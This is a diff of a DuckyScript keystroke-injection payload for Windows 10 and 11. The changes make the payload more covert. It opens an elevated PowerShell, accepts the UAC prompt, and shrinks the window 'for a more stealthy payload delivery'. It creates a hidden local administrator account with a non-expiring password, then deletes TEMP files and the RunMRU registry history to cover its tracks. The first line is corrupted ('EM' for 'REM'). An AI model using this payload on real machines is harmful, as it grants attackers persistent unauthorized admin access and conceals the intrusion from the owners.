@@ -1,19 +1,23 @@
-REM Title: Add_Local_Admin
+EM Title: Add_Local_Admin
 REM Author: LulzAnarchyAnon
-REM Description: PowerShell is opened, and a script 
-REM runs that adds a Local Admin User. 
-REM Target: Windows 10 and 11
+REM Description: Administrator PowerShell is opened, and resized for a more stealthy payload delivery, then the payload
+REM creates a local admin account on the target system, afterwards powershell exits, and all history is cleared.
+REM Target: Windows 10 and 11  
 REM Props: Darren Kitchen, and I am Jakoby
 REM Version: 2.0
 REM Category: Execution
 
 GUI r
-DELAY 1000
+DELAY 500
 STRING powershell -Command "Start-Process PowerShell -Verb RunAs"  
+DELAY 500
+ENTER
+DELAY 500
+ALT y
+DELAY 1000
+STRING powershell -noexit -command "[console]::WindowWidth=10; [console]::WindowHeight=5; [console]::BufferWidth=[console]::WindowWidth"
 DELAY 1000
 ENTER
-DELAY 1000
-ALT y
 DELAY 1000
 STRING $Username = "Admin2"
 DELAY 1000
@@ -67,6 +71,18 @@ STRING & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
 DELAY 1000
 ENTER
 DELAY 1000
+STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+DELAY 500
+ENTER
+DELAY 500
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+DELAY 500
+ENTER
+DELAY 200
 STRING exit
-DELAY 1000
+DELAY 200
+ENTER
+DELAY 200
+STRING exit
+DELAY 200 
 ENTER
